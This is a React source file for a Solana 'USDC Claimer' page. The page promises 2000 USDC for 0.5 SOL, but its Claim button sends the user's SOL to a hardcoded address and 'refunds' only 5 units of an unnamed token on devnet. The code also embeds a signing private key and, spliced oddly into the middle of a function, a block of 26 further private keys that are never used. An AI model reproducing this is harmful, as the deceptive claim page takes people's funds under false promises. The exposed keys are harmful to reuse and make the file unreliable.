/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5px43h5ufHyff35D5k8KQkPBKDZCJe1XP8zVLeijknbQHVfogpTpz17YJCQFCaE3TnZqPDNLSUchHWiym89r32Z1"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "1ifAEPyRkzRzppvadsoXkwjdq7mSYHgL8QMR3MwJqrnKHfiMEXP99arAnTTsaiqReRfy1HnAmZK8eN2Pq3FuMgu",
  "key1": "3esuaaHLCUTuFJNqAENUyiopctAvV1KPLycd8vU2YMGKJp3UTUwGzAdPzJPjUj7EUBo7vRjQrDRetRuRHCpdLHjz",
  "key2": "5sEPQNJDEt9SUUHV67Hz5N65q6MN7xgvCeLfWGBrs4ieo5JvubNUp8GWYDcDesXzYi92nSttNZqqX9nSAschvWyj",
  "key3": "3Fh44yXerU6376MA5yLM83uD9xLz6k8vQmVWJ1YTkBn971YJRCZuCGmftZrdbKwfcErnEqpWsEyyyy71HdeBeD7R",
  "key4": "5pAYiM7SGXBozTr2Kcetb9nrnVuwMik6inaAfGqdvagWPPeTbMafovE6oKRjh3RXg8nbLFARmXAgo5QCAqiU3F2z",
  "key5": "u79mfUHmqPsa8c9SW2bJP1bXP8179KjEzE7WSzbbmVXfe575jhAsUZa6DFjbYf8EqHrQPMQ7mh9AxZt39r11mxP",
  "key6": "2rGX4LiU2a3rhCRaqTgfMrxozc9atEy76cwY9zbdG43kuYbji75m6j2XhSXNb3LvcpMiyBvnMyE3UYfFn5LWiNmm",
  "key7": "51JBXDYcSidGZG4vVJSMNXcML19dkphj1W4fi3iWgg1vz4B87Gs3FLLzLwswqdnHu3SCW5KzHSh8Vyy2TG4EXb6K",
  "key8": "i84qiPYnGa9DE4NoXDpyUJ2oPKGV7oeEAwvEWbsY97BdgthsxpSWvudBzExGTeDk4CkZ6srqrLZQSVFomYVx7Js",
  "key9": "4MvDY7DdQCemr3eb9LzD3uifJ1jj8UjnanC11wq6o8PrpNWXGCbu8UHskWEGSrHseqdNBh99BL5dto9Fro4WHmHt",
  "key10": "3JkqbXZnjUtuTjC7aC2dSy9jBpLdenjiv9fSghP9DEBWKHabok8rvTXugkifuPBPrWr48xiEEBdkXmzNPaS56ePi",
  "key11": "2emZ5uMsyXgLZgGF9dtovzv3Ti4s313zzbz1hfqi2bpqt9Tn7poGSkiYt4R1wEoc7g6GXpYaQ1Uoca7Twbe9zdZz",
  "key12": "5gCV8jMF3QLJstzLAWbqS4RNGqAAv2TFdjfcE2UR481JaLAwhzVebSYPDvHNqEa4rgquaa7pXCFXgVFktfaXsU1w",
  "key13": "2WjBe5LS8Gmzgg8XemHbcTUZPGzU1yFQoQ4LuXc5AceritdRi2ZgX3iVVrdGy1N4GXvuMVyNBTNPNkdVw72ndVTq",
  "key14": "4VGbwAb4CNpuDK66yVwcxqbin56xjNWBBGFZUQpVZZRxG6h63gdcBsmdRQMChz8czoDY2ymswvuLG5SLCKZyd7SS",
  "key15": "5viT44xwuhuxy3tq1sXwQARQZPy7j2LwQoX5ChhR5DvLNtKngDj8YesXpn3gWnSbZpfnkdEKDVuyno3GSK18VWd9",
  "key16": "yqxTnqhZ8NdwFDrkJXE5ujgNh8zQkgr3HMazZ7HoNXiQqLeLvPhNWMNFn3CmLAc2A9U9hCSMWSVcQVqZUU6DVDK",
  "key17": "4EWWZQShMxtFhaxVPAzdfYbstMGsVvyrTr95UQxVGiphCRo9MgM9B9enTZtFMAAUtF4pa7uCX3KVpdhUBw2UGsyr",
  "key18": "5aX6LLG6V8bDTev5Q6NKruppKQ9RK9nX6Mr4q3SZjMCpYp3DaBiWi3amNL584eYTArgchDcb1o1Q3Ux7HhaY1Xxv",
  "key19": "46yuDn5tgXRqRQnUirhpCqHB6i3sGxJzHcV837eHVfoL1QN4n2183o5jyVoVXjSW5Zm1nDhxNKv2rdYBhqGEmfVJ",
  "key20": "3KrswfpvjESRXRaYgrkuQsqSP5yWAPaqaJs24kCmdJPB7bj32QEKQrgJjtsMvQedq5xjnNXjHG4YDcKMNHsM2JsF",
  "key21": "3EMbm8jUPW8guhH3ubHTBqp4TnTwYtKgw4J4UKYUzUg5hEx4zTGDrUG7fAwu2Aa8PPL7bjYeHFt9S3KBNrxPqV41",
  "key22": "VriZXoaAcN718f9FtNJgRcn8GdLy2LgsysGRs4YEDyjJwmvBLkAL73bnLgvDrkBT2ARvxticLWMvwpxy4APXdku",
  "key23": "4o4Qs2FmdcpyX8YYM9MWB5DzpNDGnygipHP5GhWvBEu7hDBS832URtjxfGdCGKW1X9qHp713ASHowhbd84GENdYd",
  "key24": "2L4n3Ru8sEaETheSLUkX3w6x8WN7iUpHop59SDBUj9MmuYav9qPDx8KYMHPG8zmHizmQ2gcD5hYSHLN7TPRQ4Cp1",
  "key25": "58hi9qccNqpVb9d6up3X3LqrQbVHZGTFCrAxe9VRxXqS2hxpJPmYtm3wtC45EjovkxiYKQTiMRDyiXBo5XdKHGxV"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
